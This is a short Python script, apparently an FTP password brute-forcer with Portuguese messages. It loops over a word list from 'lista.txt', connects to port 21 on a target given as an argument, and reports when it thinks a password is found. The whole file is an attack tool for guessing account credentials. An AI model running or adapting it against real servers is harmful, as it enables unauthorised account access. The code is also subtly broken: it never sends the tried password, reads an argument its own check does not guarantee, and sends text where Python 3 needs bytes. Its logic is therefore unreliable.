#!/usr/bin/python

import socket
import re
import sys

if len(sys.argv) < 2:
    print('use python3 BruteForce_FTP.py 127.0.0.1 usuario')
    sys.exit(0)
usuario = sys.argv[2]

file = open('lista.txt')
for linha in file.readlines():
    print('Testanto com %s:%s'%(usuario,linha))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1],21))
    s.recv(1024)
    s.send('User '+usuario+'\r\n')
    resulta = s.recv(1024)
    s.send('QUIT\r\n')

    if re.search('230',resulta):
    	print('[+] ===>>> SENHA ENCONTRADA <<<==== %s [+]'%(linha))

    else:
    	print('[-] Acesso Negado [-]\n')	